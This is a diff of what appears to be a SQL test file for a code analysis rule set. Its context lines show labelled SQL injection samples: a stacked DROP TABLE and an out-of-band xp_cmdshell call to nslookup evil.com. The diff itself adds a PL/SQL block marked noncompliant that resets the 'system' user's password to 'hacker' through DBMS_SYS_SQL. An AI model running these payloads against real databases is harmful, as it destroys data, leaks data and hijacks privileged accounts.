@@ -19,8 +19,15 @@ INSERT INTO comments (text) VALUES (''); DROP TABLE comment;
 -- Out-of-Band SQL Injection
 SELECT * FROM users WHERE username='' OR 1=1; EXEC xp_cmdshell('nslookup evil.com');
 
-DBMS_CRYPTO.Hash(str, HASH_MD4);
+DECLARE
+  c INTEGER;
+  sqltext VARCHAR2(100) := 'ALTER USER system IDENTIFIED BY hacker'; -- Might be injected by the user
+BEGIN
+  c := SYS.DBMS_SYS_SQL.OPEN_CURSOR();                               -- Noncompliant
 
-DBMS_CRYPTO.Hash(str, HASH_MD5);
+   -- Will change 'system' user's password to 'hacker'
+  SYS.DBMS_SYS_SQL.PARSE_AS_USER(c, sqltext, DBMS_SQL.NATIVE, UID);  -- Non-Compliant
 
-DBMS_CRYPTO.Hash(str, HASH_SH1);
+  SYS.DBMS_SYS_SQL.CLOSE_CURSOR(c);                                  -- Noncompliant
+END;
+/
